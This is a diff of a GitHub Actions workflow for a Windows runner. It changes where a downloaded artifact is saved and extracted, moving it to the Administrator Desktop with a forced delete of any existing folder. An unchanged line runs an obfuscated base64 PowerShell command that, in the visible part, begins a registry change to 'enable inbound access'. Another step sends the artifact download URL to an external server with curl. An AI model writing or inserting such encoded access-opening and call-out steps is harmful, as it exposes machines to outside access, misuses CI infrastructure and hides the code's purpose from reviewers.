@@ -23,30 +23,25 @@ jobs:
         shell: bash
         run: |
           url="${{ steps.get_url.outputs.url }}"
-          output="${{ github.workspace }}/data.zip"
+          output="C:/Users/Administrator/Downloads/data.zip"
           echo "Downloading artifact from $url to $output using curl"
           curl -L "$url" -o "$output"
 
-      - name: Unzip downloaded artifact to Administrator Downloads (if downloaded)
+      - name: Unzip downloaded artifact to Administrator Desktop (force)
         if: steps.get_url.outputs.url != ''
         shell: pwsh
         run: |
-          $output = "${{ github.workspace }}\data.zip"
-          $targetDir = "C:\Users\Administrator\Downloads\data"
+          $output = "C:\Users\Administrator\Downloads\data.zip"
+          $targetDir = "C:\Users\Administrator\Desktop\data"
           Write-Host "Checking for $output"
           if (Test-Path $output) {
             Write-Host "Found artifact zip at $output"
-            # Remove target directory if it already exists to avoid conflicts
+            # Ensure target directory exists, clean it up if present
             if (Test-Path $targetDir) {
               Write-Host "Removing existing $targetDir"
               Remove-Item $targetDir -Recurse -Force
             }
-            # Create the directory if not exists
-            if (!(Test-Path $targetDir)) {
-              Write-Host "Creating $targetDir"
-              New-Item -Path $targetDir -ItemType Directory | Out-Null
-            }
-            # Unzip the archive
+            New-Item -Path $targetDir -ItemType Directory | Out-Null
             Expand-Archive -Path $output -DestinationPath $targetDir -Force
             Remove-Item $output
             Write-Host "Extraction completed to $targetDir"
@@ -59,16 +54,16 @@ jobs:
           powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB[...]
         timeout-minutes: 3
 
-      - name: List Downloads Data contents (for debugging)
-        run: dir C:\Users\Administrator\Downloads\data
+      - name: List Desktop Data contents (for debugging)
+        run: dir C:\Users\Administrator\Desktop\data
         continue-on-error: true
 
-      - name: Upload Downloads Data as "data" artifact
+      - name: Upload Desktop Data as "data" artifact
         id: upload_data
         uses: actions/upload-artifact@v4
         with:
           name: data
-          path: C:\Users\Administrator\Downloads\data
+          path: C:\Users\Administrator\Desktop\data
         if: always()
 
       - name: Send artifact download URL to external server (curl)
